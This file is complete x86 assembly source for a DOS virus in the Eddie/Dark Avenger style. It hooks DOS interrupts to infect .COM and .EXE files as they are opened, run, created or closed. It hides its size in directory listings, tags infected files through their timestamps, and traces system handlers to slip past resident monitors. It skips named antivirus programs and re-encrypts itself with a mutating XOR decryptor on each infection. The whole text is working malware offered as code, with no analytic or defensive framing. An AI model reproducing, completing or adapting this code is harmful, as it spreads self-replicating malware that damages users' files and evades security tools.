
        .radix  16

	sub	bl,bl
	mov	cx,offset msg-calldos-2
	mov	si,offset calldos
	cld
lpp:
	lodsb
	xor	bl,al
	loop	lpp
	mov	byte ptr [checksum],bl

	mov	bp,offset adjust
	call	install1
	mov	dx,offset Hellomsg
	mov	ah,9
	int	21
	int	20

Hellomsg db	0a,0dh,'OK friend...',0a,0dh,'$'

	Virus_lenght	equ	endcode-adjust
	alllen		equ	buffer-adjust

	adjust	label word

	new_addr	dd	0
last:
	my_count	dw	0

	checksum	db	0

;*******************************************************************
;                                                                  *
;                  This is the program entry....                   *
;                                                                  *
;*******************************************************************

Start_Virus:

First_instr label word

old	label	dword	;

	cli
	push	ax

        call    nextline

nextline:

popreg	label byte


	db	01011000b ;pop reg

pushreg label byte

	db	01010000b ;push reg
f_g:

	db	10000001b ;add reg,value

addtoreg  label byte

	db	11000000b ;reg

	dw	offset codedstart-nextline ;value

loadcount label byte

	db	10111000b ;mov  reg,value
	dw	offset endcode-Start_Virus	;value

where:

decode:

	db	002e	;xor byte ptr cs:[reg+0],value
	db	10000000b

xorreg   label byte

	db	70

	db	00

xorvalue label byte

	db	00

incmain  label byte

	db	01000000b ;inc reg

deccount label byte

	db	01001000b ;dec reg

	jnz	decode

codedstart:

	pop	bp

	jmp	codedstart1

;**************************************************
;       call    next                              *
;next:                                            *
;       pop     *reg*                             *
;       push    *reg*                             *
;       add     *reg*,codestart-nextline          *
;       mov     *countreg*,endcode-codedstart     *
;decode:                                          *
;       xor     byte ptr cs:[*reg*+0],xorvalue    *
;       inc     *reg*                             *
;       dec     *countreg*                        *
;       jnz     decode                            *
;                                                 *
; *reg*=index register,*countreg*=register        *
;**************************************************

calldos:

	pushf
	call	dword ptr cs:[old-adjust]
        ret


give_him:

	push	bp
	mov	bp,sp
	push	ax
	push	si		;you can't use this function illegally...
	push	ds
	lds	si,[bp+2]
	lodsw
	sub	ax,0C008
	jz	me
	cli
	hlt
me:
	pop	ds
	pop	si
	pop	ax
	pop	bp

	cmp	byte ptr cs:[last-adjust],0FF ;Already got?
	je	gotten
	cmp	byte ptr cs:[f_g-adjust],0FF
	jne	gotten
all_ok:
	mov	es,word ptr cs:[where-adjust]
	mov	byte ptr cs:[last-adjust],0FF
	iret

go_out2:
	jmp	out

gotten:
	xchg	ah,al
	iret

FF_old1:
	call	calldos
	jmp	FF_old

FF_new1:
	call	calldos
	jmp	FF_new


res:
	cmp	ax,0FA01h
	je	give_him

	cmp	ah,11
	je	FF_old1
	cmp	ah,12
	je	FF_old1
	cmp	ah,4e
	je	FF_new1
	cmp	ah,4f
	je	FF_new1
	cmp	ax,4b00
	jne	go_out2
	cmp	byte ptr cs:[f_g-adjust],0FF
	je	go_out2
	push	ax
        push    bx
	push	cx
	push	dx
	push	si
	push	di
	push	ds
	push	es

	push	ds
        mov     ah,62
        call    calldos
        mov     ds,bx
        cmp     bx,[16]
	pop	ds
        jne     notthis

	call	get
	mov	bx,word ptr cs:[last-adjust]
	mov	ds,bx
	cmp	[0001],bx
	jb	notthis
	inc	bx
	push	word ptr [0001]
	mov	es,bx
	mov	bx,[0003]
	add	bx,130
	mov	ah,4ah
	call	calldos
	pop	word ptr [0001]
	jnc	allok
notthis:
	jmp	notnow
allok:
	mov	byte ptr cs:[f_g-adjust],0FF
	lds	si,cs:[new_addr-adjust]
	add	si,offset calldos-adjust
	sub	bl,bl
	mov	cx,offset msg-calldos-2
	cld
check:
	lodsb
	xor	bl,al
	loop	check
	cmp	bl,byte ptr cs:[checksum-adjust]
	jne	notnow
	mov	ax,0FA01
	int	21
	or	al,al
	sub	di,di
	lds	si,cs:[new_addr-adjust]
	mov	cx,Virus_lenght
        push    cx
        push    si
        push    ds
	rep	movsb
	mov	bx,es
        pop     es
        pop     di
        pop     cx
        sub     al,al
        rep     stosb
	push	cs
	mov	ax,offset notnow2-adjust
	push	ax
	push	bx
	mov	ax,offset Set_Vectors-adjust
	push	ax
	retf

notnow2:
	pop	es
	pop	ds
	pop	di
	pop	si
	pop	dx
	pop	cx
        pop     bx
	pop	ax
	int	21
	db	0ca,2,0 ;retf 2

notnow:
	pop	es
	pop	ds
	pop	di
	pop	si
	pop	dx
	pop	cx
        pop     bx
	pop	ax

out:
	jmp	dword ptr cs:[old-adjust]

get:
	push	bx
	push	ds
	push	es

        mov     ah,52h
	call	calldos
        mov     bx,es:[bx-02]
search:
        mov     ds,bx
	inc	bx
        add     bx,[0003]
	mov	es,bx
        cmp     byte ptr es:[0000],'Z'
	jne	search

	mov	word ptr cs:[last-adjust],ds
	mov	word ptr cs:[where-adjust],bx

	pop	es
	pop	ds
	pop	bx
	ret

FF_old:
	push	ax
	push	bx
	push	dx
	push	es

	or	al,al
	jnz	Go_Out_ ;if error

	mov	ah,2f				;get DTA address
	call	calldos

	cmp	byte ptr es:[bx],0ff
	jne	standart
	add	bx,7

standart:
	mov	al,byte ptr es:[bx+30d-7] ;Seconds in al
	and	al,31d			;Mask seconds
	cmp	al,60d/2			;Seconds=60?
	jne	Go_Out_
	and	byte ptr es:[bx+30d-7],11100000b
	mov	ax,es:[bx+36d-7]
	mov	dx,es:[bx+38d-7]		;Check File size
	sub	ax,Virus_lenght
	sbb	dx,0
	jb	Go_Out_


Adjust_Size:

	mov	es:[bx+28d+1],ax
	mov	es:[bx+28d+2+1],dx

Go_Out_:

	pop	es			;Return to caller
	pop	dx
	pop	bx
	pop	ax
	iret

FF_new:
	pushf
	push	ax
	push	bx
	push	dx			;fuck again
	push	es
	jc	Go_Out_1

	mov	ah,2f
	call	calldos

	mov	al,es:[bx+22d]
	and	al,31d
	cmp	al,60d/2
	jne	Go_Out_1
        and     byte ptr es:[bx+22d],11100000b
	mov	ax,es:[bx+26d]
	mov	dx,es:[bx+28d]
	sub	ax,Virus_lenght
	sbb	dx,0
	jb	Go_Out_1

Adjust_Size1:

	mov	es:[bx+26d],ax
	mov	es:[bx+28d],dx

Go_Out_1:

	pop	es
	pop	dx
	pop	bx
	pop	ax			; Dummy proc far
	popf				; ret   2
	db	0ca,2,0 ;retf 2         ; Dummy endp =>  BUT too long...

endinst label word

codedstart1:

	sti
	pop	ax

install:

	sub	bp,offset nextline-adjust

install1:

	cld					;Clear direction flag
	push	ax				;Save some registres
	push	es
	push	ds

	mov	ax,0FA01
	int	21
	or	al,al
	jz	do_dob
	jmp	install_ok
do_dob:
	push	es
	pop	ds
	mov	ax,[0002]
	mov	cx,1000
	sub	ax,cx
	mov	es,ax
	sub	di,di
	call	SearchZero
	jc	Dont_copy
	mov	si,bp
	mov	cx,alllen
	db	2e
	rep	movsb

Dont_copy:

	sub	ax,ax
	mov	ds,ax
	mov	ax,[21*4]
	mov	word ptr cs:[bp+old-adjust],ax
	mov	ax,[21*4+2]
	mov	word ptr cs:[bp+old-adjust+2],ax
	mov	ah,52
	int	21
	push	es
	mov	es,es:[bx+14]
	push	es:[2]
	sub	di,di
	mov	si,bp
	mov	cx,endinst-adjust
	db	2e
	rep	movsb
	pop	ax
	pop	ds
	mov	[bx+14],ax
	mov	ds,cx
	mov	[21*4],offset res-adjust
	mov	[21*4+2],es
	jcxz	Run_The_Program

install_ok:

	cmp	ax,01FAh
	je	Run_The_Program
	mov	word ptr cs:[bp+handle-adjust],0ffff ;set handle_save
	mov	si,bp
	sub	di,di
	mov	cx,alllen
	db	2e
	rep	movsb
	push	cs
	mov	ax,Run_The_Program-adjust
	add	ax,bp
	push	ax
	push	es
	mov	ax,offset Set_Vectors-adjust	;Set vectors
	push	ax
	retf

SearchZero:

	sub	ax,ax
Again:
	inc	di
	push	cx
	push	di
	mov	cx,alllen
	repe	scasb
	pop	di
	jz	FoundPlace
	pop	cx
	loop	Again
	stc
	ret

FoundPlace:

	pop	cx
	mov	word ptr cs:[bp+new_addr-adjust],di
	mov	word ptr cs:[bp+new_addr-adjust+2],es
	clc
	ret

Run_The_Program:

	add	bp,offset First_18-adjust
	pop	ds				;Restore saved ds,es,ax
	pop	es				;ds=es=PSP
	pop	ax
	mov	ax,'ZM'
	cmp	cs:[bp],ax	;Run the infected program
	je	run_exe
	xchg	ah,al
	cmp	cs:[bp],ax
	je	run_exe
	jne	Run_COM_File
run_exe:
	mov	cx,ds				;Calculate load segment
	add	cx,0010
	mov	bx,cx
	add	cx,cs:[bp+16]	;Calculate CS value
	add	bx,cs:[bp+0e]	;Calculate SS value
	mov	ss,bx				;Run .EXE program
	mov	sp,word ptr cs:[bp+10]
	push	cx
	push	word ptr cs:[bp+14]
	retf

Run_COM_File:

	mov	di,0100
	push	di
	mov	si,bp
	movsb					;Restore the first 3 bytes
	movsw					;Run .COM program
	ret

	db	'Œ­®£® ±¬¥!'

INT_21h_Entry_Point:

	cmp	ah,3ch			;Create (3.X)
	je	create
	cmp	ah,5bh
	je	create

	cmp	ah,6ch
	jne	not_create		;Create (4.X)
	test	bl,1
	jz	not_create
	jnz	create

not_create:

	call	pusha

	mov	byte ptr cs:[function-adjust],ah

	cmp	ah,6ch		;Open (4.X)
	je	create_

	cmp	ah,3dh
	je	Function_4Bh

	cmp	ah,3e		;Close
	je	close_

	cmp	ax,4b00 ;Exec
	je	Function_4Bh

Return_Control:

	call	popa

Go_out:
	jmp	dword ptr cs:[current_21h-adjust]	;go to the old int 21

create_:

	or	bl,bl		;Create file?
	jnz	Return_Control
	mov	dx,si

Function_4Bh:

	mov	ax,3d00h
	call	Infect_It
	jmp	Return_Control

create:
        cmp     word ptr cs:[handle-adjust],0ffff
        jne     Go_out
	call	Call_Original_INT_21h
	mov	word ptr cs:[handle-adjust],ax
	jnc	Error
	mov	word ptr cs:[handle-adjust],0ffff
Error:
;       retf    2
	db 0ca,2,0

close_:
	cmp	word ptr cs:[handle-adjust],0ffff
	je	Return_Control
	cmp	bx,word ptr cs:[handle-adjust]
	jne	Return_Control
	mov	ah,45
	call	Infect_It
	mov	word ptr cs:[handle-adjust],0ffff
	jmp	Return_Control

	;******************************************
	;                                         *
	;       This infects the programs...      *
	;                                         *
	;******************************************

Infect_It:

	call	Call_Original_INT_21h		;this is the infecting part
	jnc	No_error
	ret

No_error:

	xchg	ax,bp

	mov	ax,0200
	push	ax
	popf

	mov	byte ptr cs:[flag-adjust],0

	mov	ah,54
	call	Call_Original_INT_21h
	mov	byte ptr cs:[veri-adjust],al
	cmp	al,1				;Switch off verify...
	jne	Go_On_Setting
	mov	ax,2e00
	call	Call_Original_INT_21h

Go_On_Setting:


	mov	ax,3513
	call	Call_Original_INT_21h
	push	bx
	push	es

	mov	word ptr cs:[current_13h-adjust],bx
	mov	word ptr cs:[current_13h-adjust+2],es

	mov	ah,25
	mov	dx,INT_13h_entry-adjust ;Set int 13h
	push	cs
	pop	ds
	call	Call_Original_INT_21h

	mov	ax,3524
	call	Call_Original_INT_21h
	push	bx
	push	es

	mov	ah,25
	mov	dx,INT_24h_entry-adjust ;Set int 24h (Useless maybe...).
	call	Call_Original_INT_21h

	push	cs
	push	cs
	pop	ds
	pop	es
	mov	dx,offset DOS_13h-adjust
	mov	bx,dx			;Set New DOS int 13h
	mov	ah,13
	call	Call_Original_INT_2Fh

	push	bx
	push	es
	push	dx
	push	ds

	push	cs
	pop	ds

	xchg	bx,bp
	push	bx
	mov	ax,1220
	call	Call_Original_INT_2Fh
	mov	bl,es:[di]		;Remember the good old V512 ?
	mov	ax,1216
	call	Call_Original_INT_2Fh
	pop	bx
	add	di,11

	mov	byte ptr es:[di-15d],2
	mov	ax,es:[di]
	mov	dx,es:[di+2]
	cmp	ax,3000d
	sbb	dx,0
	jb	Not_good
Go_on:
	cmp	byte ptr cs:[function-adjust],3dh
	je	Scan_name
	cmp	byte ptr cs:[function-adjust],6ch
	jne	Dont_Scan_Name

Scan_name:

	push	di
	add	di,0f
	mov	si,offset fname-adjust	;wasn't that the last opened file?
	cld
	mov	cx,8+3
	rep	cmpsb
	pop	di
	je	Not_good

Dont_Scan_Name:

	cmp	es:[di+18],'MO'
	jne	Check_For_EXE			;check for .COM file
	cmp	byte ptr es:[di+17],'C'
	jne	Check_For_EXE
	jmp	com

Check_For_EXE:

	cmp	es:[di+18],'EX'
	jne	Not_good			;check for .EXE file
	cmp	byte ptr es:[di+17],'E'
	je	Check_For_Valid_EXE

Not_good:

	jmp	close

Check_For_Valid_EXE:

	call	Read_First_18
	cmp	word ptr [si],'ZM'
	je	Valid_EXE			;check for valid .EXE file
	cmp	word ptr [si],'MZ'
	jne	Not_good

 Valid_EXE:

	cmp	byte ptr es:[di+0f],'M' ;MAPMEM
	je	Not_good
	cmp	es:[di+0f],'RT'	 ;TRAPFILE
	je	Not_good
	cmp	es:[di+0f],'CS' ;SCAN.EXE
	jne	go_on_a
	cmp	es:[di+11],'NA'
	je	Not_good
go_on_a:
	cmp	es:[di+0f],'NA' ;ANTI****.*EXE
	jne	go_on_b
	cmp	es:[di+11],'IT'
	je	Not_good
go_on_b:
	cmp	es:[di+0f],'LC' ;CLEANNEW.EXE
	jne	low_mem?
	cmp	es:[di+11],'AE'
	je	Not_good

Low_mem?:
	cmp	word ptr [si+0c],0ffff	;only low-mem .EXE
	jne	Not_good

Low_Mem:

	mov	cx,[si+16]
	add	cx,[si+8]			;Something common with EDDIE..
	mov	ax,10
	mul	cx
	add	ax,[si+14]
	adc	dx,0
	mov	cx,es:[di]
	sub	cx,ax
	xchg	ax,cx
	mov	cx,es:[di+2]
	sbb	cx,dx
	or	cx,cx
	jnz	Not_Infected_EXE			;infected?
	cmp	ax,(endcode-Start_Virus)
	jbe	Not_good

Not_Infected_EXE:

	mov	ax,es:[di]
	mov	dx,es:[di+2]

	add	ax,Virus_lenght
	adc	dx,0
	mov	cx,200					;(C) by Lubo & Jan...
	div	cx
	mov	[si+2],dx
	or	dx,dx
	jz	OK_MOD
	inc	ax

OK_MOD:
	mov	[si+4],ax
	mov	ax,es:[di]
	mov	dx,es:[di+2]

	mov	cx,10
	div	cx

	sub	ax,[si+8]
	add	dx,Start_Virus-adjust
	adc	ax,0
	mov	[si+14],dx
	mov	[si+16],ax
	add	ax,(Virus_lenght)/16d+1
	mov	[si+0eh],ax
	mov	[si+10],100
 write:
	mov	ax,5700
	call	Call_Original_INT_21h
	push	cx
	push	dx

	sub	cx,cx
	mov	es:[di+4],cx
	mov	es:[di+6],cx
	mov	cl,20
	xchg	cl,byte ptr es:[di-0dh]
	push	cx
	mov	ah,40	;this writes the first few bytes and glues the virus
	mov	dx,buffer-adjust
	mov	cx,18

	call	Call_Original_INT_21h

	call	make_mutation

	push	es
	push	di
	push	cs
	pop	es
	mov	di,si
	sub	si,si
	mov	cx,Virus_lenght
	push	di
	rep	movsb
	pop	di
	add	di,offset codedstart-adjust
	mov	al,byte ptr [xorvalue-adjust]
	mov	cx,offset endcode-codedstart

codeit:
	xor	byte ptr [di],al
	inc	di
	loop	codeit

	pop	di
	pop	es

	inc	word ptr [my_count-adjust]

	mov	ax,es:[di]
	mov	es:[di+4],ax
	mov	ax,es:[di+2]
	mov	es:[di+6],ax
	call	Check_For_COMMAND	;(C)
	jne	Dont_Adjust_Size
	sub	es:[di+4],Virus_lenght

Dont_Adjust_Size:

	mov	ah,40
	mov	dx,offset buffer-adjust
	mov	cx,Virus_lenght
	call	Call_Original_INT_21h

	pop	cx
	mov	byte ptr es:[di-0dh],cl
	pop	dx
	pop	cx

	cmp	byte ptr cs:[flag-adjust],0ff
	je	Set_Time_and_Date
exit:
	call	Check_For_COMMAND
	je	Set_Time_and_Date
	and	cl,11100000b
	or	cl,60d/2

Set_Time_and_Date:

	mov	ax,5701
	call	Call_Original_INT_21h
close:

	mov	ah,3e
	call	Call_Original_INT_21h
	mov	si,di
	add	si,0f
	mov	di,fname-adjust
	push	es
	pop	ds
	push	cs
	pop	es
	mov	cx,8+3		;save the fname to a quit place
	rep	movsb
	push	cs
	pop	ds

	cmp	byte ptr cs:[flag-adjust],0ff
	jne	Dont_Clear_Buffers
	mov	ah,0dh			;if error occured-clear disk buffers

	call	Call_Original_INT_21h

Dont_Clear_Buffers:

	cmp	byte ptr cs:[veri-adjust],1
	jne	Restore_Vectors
	mov	ax,2e01

	call	Call_Original_INT_21h

Restore_Vectors:


	pop	ds
	pop	dx
	pop	es
	pop	bx

	mov	ah,13
	call	Call_Original_INT_2Fh

	sub	ax,ax
	mov	ds,ax
	pop	[24*4+2]
	pop	[24*4]
	pop	[13*4+2]
	pop	[13*4]		;restore vectors and return
	ret

 com:
	test	byte ptr es:[di-0dh],4	;if it is a system file
	jnz	Not_OK_COM_File ;I had some problems here with
                                        ;V1160 & V1776 (with the ball)
	cmp	es:[di],65535d-Virus_lenght*2-100
	ja	Not_OK_COM_File

	cmp	es:[di+0f],'RT' ;TRAPFILE
	je	Not_OK_COM_File
	cmp	byte ptr es:[di+0f],'M' ;MV.COM
	je	Not_OK_COM_File

	call	Read_First_18
	mov	ax,[si+10]	;CHECK IF THAT'S A TRAP FILE
	cmp	ax,[si+12]
	je	Not_OK_COM_File
	cmp	byte ptr [si],0E9
	jne	OK_COM_file
	mov	ax,es:[di]
        sub     ax,[si+1]               ;infected?
	cmp	ax,(endcode-Start_Virus+3)
	jbe	Not_OK_COM_File

OK_COM_file:

	mov	ax,es:[di]
	add	ax,Start_Virus-adjust-3
	call	Check_For_COMMAND
	jne	Normally
	sub	ax,Virus_lenght

Normally:

	mov	byte ptr [si],0E9
	mov	word ptr [si+1],ax
	jmp	write

Not_OK_COM_File:

	jmp	close

Set_Vectors:

	sub	ax,ax
	mov	ds,ax

	push	[1*4]
	push	[1*4+2] ; <= (C) by N.Hacker.

	pushf
	pushf
	pushf
	pushf

	mov	byte ptr cs:[flag-adjust],ah
	mov	byte ptr cs:[my_flag-adjust],ah
	mov	word ptr cs:[limit-adjust],300
	mov	word ptr cs:[mem_-adjust],org_21h-adjust

	mov	[1*4],offset trap-adjust
	mov	[1*4+2],cs

	call	set_trace

	mov	ax,3521

	call	dword ptr [21h*4]

	mov	word ptr cs:[current_21h-adjust],bx	;get old int 21
	mov	word ptr cs:[current_21h-adjust+2],es

	mov	byte ptr cs:[flag-adjust],0
	mov	word ptr cs:[mem_-adjust],org_2fh-adjust

	call	set_trace

	mov	ax,1200

	call	dword ptr [2fh*4]		;do trace int 2f


	mov	byte ptr cs:[flag-adjust],0
	mov	byte ptr cs:[my_flag-adjust],0FF
	mov	word ptr cs:[limit-adjust],0C800
	mov	word ptr cs:[mem_-adjust],org_13h-adjust

	call	set_trace

	sub	ah,ah

	call	dword ptr [13h*4]	;do trace int 13

	mov	byte ptr cs:[flag-adjust],0
	mov	word ptr cs:[limit-adjust],0F000
	mov	word ptr cs:[mem_-adjust],Floppy_org_13h-adjust

	call	set_trace

	sub	ah,ah

	call	dword ptr [13h*4]

	pop	[1*4+2]
	pop	[1*4]

	mov	[21*4],offset INT_21h_Entry_Point-adjust		;set it
	mov	[21*4+2],cs

	retf

set_trace:

	pushf
	pop	ax
	or	ax,100
	push	ax
	popf
	ret

trap:
	push	bp
	mov	bp,sp
	push	bx
	push	di
	cmp	byte ptr cs:[flag-adjust],0ff
	je	off
	mov	di,word ptr cs:[mem_-adjust]
	mov	bx,word ptr cs:[limit-adjust]
	cmp	[bp+4],bx
	pushf
	cmp	byte ptr cs:[my_flag-adjust],0ff
	jne	It_Is_JA

	popf
	jb	Go_out_of_trap
	jmp	It_Is_JB

It_Is_JA:

	popf
	ja	Go_out_of_trap

It_Is_JB:

	mov	bx,[bp+2]
	mov	word ptr cs:[di],bx
	mov	bx,[bp+4]
	mov	word ptr cs:[di+2],bx
	mov	byte ptr cs:[flag-adjust],0ff
off:
	and	[bp+6],0feff

Go_out_of_trap:

	pop	di
	pop	bx
	pop	bp
	iret


Call_Original_INT_21h:

	pushf
	call	dword ptr cs:[org_21h-adjust]
	ret



Call_Original_INT_2Fh:

	pushf
	call	dword ptr cs:[org_2fh-adjust]
	ret

INT_24h_entry:

	mov	al,3
	iret

;**************************
;    (C) by N.Hacker.     *
;      (bellow)           *
;**************************

INT_13h_entry:

	mov	byte ptr cs:[next_flag-adjust],0

	cmp	ah,2
	jne	Other

	cmp	byte ptr cs:[function-adjust],03Eh
	jne	Dont_hide

	dec	byte ptr cs:[next_flag-adjust]
	inc	ah
	jnz	Dont_hide

Other:

	cmp	ah,3
	jne	Dont_hide

	cmp	byte ptr cs:[flag-adjust],0ff
	je	no_error_

	cmp	byte ptr cs:[function-adjust],03Eh
	je	Dont_hide

	inc	byte ptr cs:[next_flag-adjust]
	dec	ah

Dont_hide:

	pushf
	call	dword ptr cs:[current_13h-adjust]
	jnc	no_error_
	mov	byte ptr cs:[flag-adjust],0ff

no_error_:

	clc
	db	0ca,02,0		;retf 2


DOS_13h:

	cmp	byte ptr cs:[next_flag-adjust],0
	je	OK

	cmp	ah,2
	je	Next
	cmp	ah,3
	jne	OK
Next:
	cmp	byte ptr cs:[next_flag-adjust],1
	jne	Read
	inc	ah
	jne	OK
Read:

	dec	ah
OK:
	test	dl,80
	jz	Floppy
	jmp	dword ptr cs:[org_13h-adjust]
Floppy:
	jmp	dword ptr cs:[Floppy_org_13h-adjust]


Read_First_18:

	sub	ax,ax
	mov	es:[di+4],ax
	mov	es:[di+6],ax
	mov	ah,3f
	mov	cx,18
	mov	dx,buffer-adjust
	mov	si,dx
	call	Call_Original_INT_21h
	call	pusha
	push	cs
	pop	es
	mov	di,offset First_18-adjust
	mov	cx,18
	rep	movsb
	call	popa
        ret

Check_For_COMMAND:

	cmp	es:[di+0f],'OC'
	jne	Not_COMMAND
	cmp	es:[di+11],'MM'
	jne	Not_COMMAND
	cmp	es:[di+13],'NA'
	jne	Not_COMMAND			;check for command.com
	cmp	es:[di+15],' D'
	jne	Not_COMMAND
	cmp	es:[di+17],'OC'
	jne	Not_COMMAND
	cmp	byte ptr es:[di+19],'M'

Not_COMMAND:

	ret

pusha:
	pop	word ptr cs:[ret_addr-adjust]
	pushf
	push	ax
	push	bx
	push	cx
	push	dx
	push	si
	push	di
	push	bp
	push	ds
	push	es
	jmp	word ptr cs:[ret_addr-adjust]

popa:
	pop	word ptr cs:[ret_addr-adjust]
	pop	es
	pop	ds
	pop	bp
	pop	di
	pop	si
	pop	dx
	pop	cx
	pop	bx
	pop	ax
	popf
	jmp	word ptr cs:[ret_addr-adjust]

make_mutation:

        sub     ax,ax
	mov	ds,ax
	mov	ax,[046C]
	or	al,al
	clc
	jnz	good_value
	inc	al
	stc

good_value:

	push	cs
	pop	ds

	mov	byte ptr [xorvalue-adjust],al
	jnc	well_ok
	dec	al

well_ok:

	and	al,0111b	;BX,SI,DI,BP
	or	al,0100b

	cmp	al,0100b
	jne	okreg
	inc	al

okreg:

	and	byte ptr [popreg-adjust],11111000b
	or	byte ptr [popreg-adjust],al

	and	byte ptr [addtoreg-adjust],11111000b
	or	byte ptr [addtoreg-adjust],al

	and	byte ptr [incmain-adjust],11111000b
	or	byte ptr [incmain-adjust],al

	and	byte ptr [pushreg-adjust],11111000b
	or	byte ptr [pushreg-adjust],al

	call	adjustreg

	and	byte ptr [xorreg-adjust],11111000b
	or	byte ptr [xorreg-adjust],al

	and	ah,0011b	;AX,CX,DX
	cmp	ah,0011b	;00,01,02
	jne	okreg2
	dec	ah
okreg2:

	and	byte ptr [loadcount-adjust],11111000b
	or	byte ptr [loadcount-adjust],ah

	and	byte ptr [deccount-adjust],11111000b
	or	byte ptr [deccount-adjust],ah

	mov	ax,word ptr [First_instr-adjust]
	xchg	ah,al
	mov	word ptr [First_instr-adjust],ax

	ret


adjustreg:

	cmp	al,0011b
	je	abx
	cmp	al,0101b
	je	abp
	cmp	al,0110b
	je	asi
	mov	al,0101b
	ret
abx:
	mov	al,0111b
	ret
abp:
	mov	al,0110b
	ret
asi:
	mov	al,0100b
	ret


msg:

First_18:

	ret
	db	17	dup (?)


endcode label	word

	current_21h	dd ?
	current_13h	dd ?
	org_2fh dd	?
	org_13h dd	?
	org_21h dd	?
	Floppy_org_13h	dd ?
	flag	db	?	;0ff if error occureŒò
	veri	db	?
	handle	dw	?
	fname	db	8+3 dup (?)
	function db	?
	my_flag db ?
	limit		dw ?
	mem_		dw ?
	next_flag	db ?
	ret_addr	dw ?

buffer	label	word

